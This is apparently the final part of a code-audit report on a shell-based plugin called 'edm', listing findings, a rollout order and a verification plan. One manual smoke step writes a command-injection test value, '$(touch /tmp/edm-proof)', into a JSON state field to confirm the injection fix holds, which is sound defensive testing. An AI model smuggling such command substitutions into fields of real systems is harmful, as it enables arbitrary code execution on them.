7. **CA-132** `decisions.md:12` -- no Mermaid renderer spike. **D8** records it as a boundary with no
   ticket by construction; the deterministic lint class ships regardless.

## Documented as intentional in code, a comment, or an authorized exception

8. **CA-111** `.gitlab-ci.yml:10-19` -- the two pinned digests are self-declared placeholders to be
   refreshed before the pipeline is first enabled; documented in the file itself.
9. **CA-112** `.gitlab-ci.yml:277` -- the floating `bash:3.2` tag and the absent macOS runner are
   authorized named exceptions. The `apt-get` divergence in the same job is **not** covered by that
   authorization and is CA-006.
10. **CA-113** `bin/tests/run-all.sh:2` -- em dashes in `bin/tests/` comments are explicitly carved
    out of the ASCII sweep as comments never read as prompt text. The stdout instance is CA-079.
11. **CA-114** `bin/edm-state:3407-3412` -- `pattern_target_heading_for` ignores its argument by
    design; documented at `:3373-3380` as the extension point, coupled to a README mapping row.
12. **CA-115** `bin/edm-check-grants:136-138` -- grant source 2 is deliberately not fence-skipped;
    the lens launch template lives inside a fence and skipping it would blind the checker.
13. **CA-116** `bin/edm-check-grants:550-555` -- the actor-first output shape is required by its own
    AC7, and the unconditional `Edit` warning is advisory by design (it is how the synthesizer's
    unexplained grant was found).
14. **CA-119** `bin/edm-state:1831-1833` -- the advance-by-one arithmetic is a no-op today, retained
    against `schema_version: 3`, which CLAUDE.md records as deliberately unassigned.
15. **CA-120** `evals/score-artifacts.sh:542-587` -- `cmd_compare` is a second comparison
    implementation CI does not use, retained deliberately and exercised by `wave7:464-478`.
16. **CA-121** `evals/tiering-matrix.sh:251` -- the unknown-flag guard cannot see `-h`/`--help`
    because both exit earlier; a deliberate two-stage parse.
17. **CA-123** `bin/edm-state:718-726` -- `flock` on fd 200 is deliberately above the range bash
    internals and `BASH_XTRACEFD` use, and is correct for bash 3.2, which has no `{fd}`
    auto-assignment. No fd conflicts exist anywhere in scope.
18. **CA-126** `bin/edm-state:3030` -- the expected-status list omits `deferred` deliberately;
    advertising abolished vocabulary would contradict the policy `edm-check-vocabulary` enforces.
19. **CA-128** `agents/edm-audit-dry.md` -- the eleven-way lens JSONL skeleton is deliberately not
    factored to one reference: a missed reference costs a lost finding and the block shows zero drift.
20. **CA-129** `.gitlab-ci.yml:189` -- `lint:pattern-library-contract` duplicating the smoke twin is
    documented; compared rule by rule with no drift, the CI job being the fast-fail authoritative copy.

## Pre-existing, unreachable, or safe for every value on disk

21. **CA-117** `bin/edm-check-grants:227-241` -- `set -- $list` runs unquoted and is subject to
    pathname expansion, safe because no tool token matches a file and `nullglob` is off.
22. **CA-118** `bin/edm-init:159` -- `git rev-parse --verify` is unqualified to `refs/heads/`;
    pre-existing and unreachable for the names this script generates.
23. **CA-122** `bin/edm-lint-artifacts:184` -- an `edm-lint-ignore-end` inside a fence closes the
    block; requires a mermaid source line containing that literal HTML comment.
24. **CA-124** `evals/run-eval.sh:151` -- `git add -A` violates the staging convention but operates
    on a throwaway scratch repo, never the user's tree.
25. **CA-125** `bin/edm-state:1058` -- the `SETTABLE_KEYS` widening beyond T09 AC11's three named
    keys is in scope by construction, since AC5 requires every legal key and AC11 makes live callers
    the source of truth.

## Out of scope for this audit, routed rather than filtered

26. **CA-127** repository-root `CLAUDE.md` -- still records edm at v2.1.0 with a 13-skill list where
    14 exist and `verify-runtime` is absent. Outside this audit's file scope; routed to the
    repository owner rather than dropped.
27. **CA-130** `agents/edm-audit-wiring.md:8` -- the lens frontmatter grants `Write` but all eleven
    agents reported `Write` absent from their runtime tool set, so step 7 is unfollowable in
    practice and the orchestrator transcribed all eleven markdown reports. A host-side gap between a
    declared grant and a delivered capability, not a repository defect -- but it is why this round
    produced no `.jsonl` halves (CA-020) and why every lens report carries a transcription note.
28. **CA-131** `skills/code-audit/SKILL.md:37` -- whether `${user_config.KEY}` interpolates inside
    prompt text at runtime could not be settled statically. It is uniform across all 14 skills and
    treated as the established convention. **If it does not interpolate, every path in every skill is
    a literal string and that is a single P0 spanning the whole prompt surface.** Worth one runtime
    check before the next round.

---

# Rollout Order

**Wave 1 -- the two open P0s, plus the two cheapest safety fixes. Independent files, parallelisable.**

1. CA-001 (`bin/edm-state` coercion) -- one file, mechanical, closes the residual of a fixed P0.
2. CA-002 (`bin/tests/wave7-smoke.sh` update-patterns coverage) -- test-only, but do it before
   touching `cmd_update_patterns` for CA-015, CA-055 or CA-056, because it is the only thing that
   will tell you whether those changes broke the insertion.
3. CA-006 and CA-024 (`.gitlab-ci.yml`) -- two one-line-class fixes that turn the pipeline from
   permanently red to informative. Nothing else can be validated in CI until these land.

**Wave 2 -- the shared-library extraction. Serialise this; everything else in the linter waits on it.**

4. CA-050 (extract `bin/_edm-lint-lib.sh`), then CA-009, CA-010, CA-057, CA-058 and CA-008 against
   the shared code, then CA-038 and CA-101 to add the corpus that proves it, then CA-019 (the awk
   rule file) and CA-039 (the scorer fixture). Ten findings, one sequence, one reviewable commit
   series. Do not parallelise: every one of them edits the same three files.

**Wave 3 -- `bin/edm-state` correctness. Group by function, parallel across groups.**

5. Lock and atomicity: CA-025, CA-015, CA-027, CA-029, CA-055, CA-059 (all touch `with_state_lock`
   or a writer -- one owner).
6. Partial-verdict and gate logic: CA-028, CA-047, CA-040, CA-093, CA-061.
7. Independent single-site fixes, parallelisable: CA-026, CA-051, CA-052, CA-054, CA-060, CA-062,
   CA-082, CA-083.

**Wave 4 -- prompt surface and spec. One change request, then the edits.**

8. CA-013 first (it is the change request that unblocks the reference-form edits), then CA-018,
   CA-020, CA-021, CA-022, CA-032, CA-048, CA-077, CA-078, CA-080, CA-081, CA-095, CA-097, CA-098.
9. Ticket-pack and decision-ledger corrections, parallel with the above: CA-033, CA-034, CA-089,
   CA-090, CA-091, CA-092.

**Wave 5 -- test suite and CI hygiene. Batchable into a small number of commits.**

10. Harness and accounting first: CA-016, CA-042, CA-036, CA-037 (they add the helpers every other
    test fix uses), then CA-035, CA-041, CA-043, CA-099, CA-100, CA-102, CA-103, CA-104.
11. Runtime hygiene: CA-045, CA-030, CA-065, CA-066, CA-067, CA-084, CA-014.
12. CI and pipeline: CA-007, CA-046, CA-063, CA-071, CA-075, CA-076, CA-085.

**Wave 6 -- documentation, one editing pass per file.**

13. CA-005, CA-011, CA-012, CA-017, CA-023, CA-031, CA-049, CA-053, CA-064, CA-068, CA-069, CA-070,
    CA-072, CA-073, CA-074, CA-079, CA-086, CA-088, CA-094, CA-096.

Nothing in this plan is deferred. D6 and D13 make every open P0, P1 and P2 blocking, and
`BLOCKING_FILTER` enforces it mechanically, so "later" is not an available disposition -- a finding
either gets a fix or gets a NOTED argument.

# Verification Plan

Syntax and static checks:

```
bash -n plugins/edm/bin/edm-state plugins/edm/bin/edm-lint-artifacts plugins/edm/bin/edm-check-grants \
        plugins/edm/bin/edm-check-vocabulary plugins/edm/bin/edm-check-skill-sync \
        plugins/edm/bin/edm-sync-canonical-sections plugins/edm/bin/edm-compare-eval \
        plugins/edm/bin/edm-init plugins/edm/bin/edm-validate-prefix
shellcheck --shell=bash --include=SC2086,SC2046,SC2048,SC2068 plugins/edm/bin/*
jq empty plugins/edm/hooks/hooks.json plugins/edm/monitors/monitors.json .claude-plugin/marketplace.json
jq -c . SRD/edm/EDMV3__prompt-streamline/code-audit/findings-ledger.jsonl > /dev/null
```

Plugin and artifact validation:

```
claude plugin validate plugins/edm/
bash plugins/edm/bin/edm-lint-artifacts --all
bash plugins/edm/bin/edm-check-grants
bash plugins/edm/bin/edm-check-vocabulary
bash plugins/edm/bin/edm-check-skill-sync
bash plugins/edm/bin/edm-sync-canonical-sections --check
bash plugins/edm/bin/edm-state validate EDMV3
bash plugins/edm/bin/edm-state render-ledger EDMV3
bash plugins/edm/bin/edm-state audit-converged EDMV3      # expect exit 1 until the blocking set is empty
```

Test suites:

```
bash plugins/edm/bin/tests/run-all.sh
bash plugins/edm/evals/tiering-matrix.sh --self-test      # must pass on macOS, not only on Linux
bash plugins/edm/bin/tests/timing.sh --lint
bash plugins/edm/bin/tests/timing.sh --mermaid-ratio
```

Manual smoke steps that no automated check covers today:

1. **Injection (CA-001, CA-003)**: write a scratch `.edm-state.json` with
   `"schema_version": "a[$(touch /tmp/edm-proof)]"` and `"current_phase"` likewise, run
   `session-start`, `validate`, `gate-check`, `phase-complete` and `migrate-schema`, and assert
   `/tmp/edm-proof` does not exist and each command emits a named diagnostic.
2. **Stale lock (CA-025)**: create a lockdir with a dead PID and confirm the next mutator reports
   `stale lock`, clears it and proceeds.
3. **Relocated root (CA-023)**: set `srd_root` to a non-`SRD` path, stage a file with an attribution
   trailer, and confirm the commit hook blocks.
4. **Indented fence (CA-009, CA-038)**: put a prohibited token inside an indented fence and confirm
   the linter, `edm-check-vocabulary` and `edm-check-grants` all agree it is suppressed; move it
   outside the fence and confirm all three flag it.
5. **Bash 3.2 (CA-006)**: one pipeline run with `test:smoke-bash32` green and
   `bash --version` printing 3.2 in its log.
6. **Prompt interpolation (CA-131)**: run one skill and confirm a `${user_config.*}` path resolves
   to a real directory rather than a literal string.

Targeted re-audit for round 2: re-run **all eleven lenses**. Findings landed in every lens this
round, and the shared-library extraction (CA-050) plus the reference-form change request (CA-013)
each touch files owned by five or more lenses, so a partial round would not be meaningful -- and by
`cmd_audit_converged`'s partial-round rule it could not close the gate anyway. Before round 2, fix
CA-020 so the lenses emit their `.jsonl` halves and the next ledger is built from the authoritative
artifact rather than from prose.
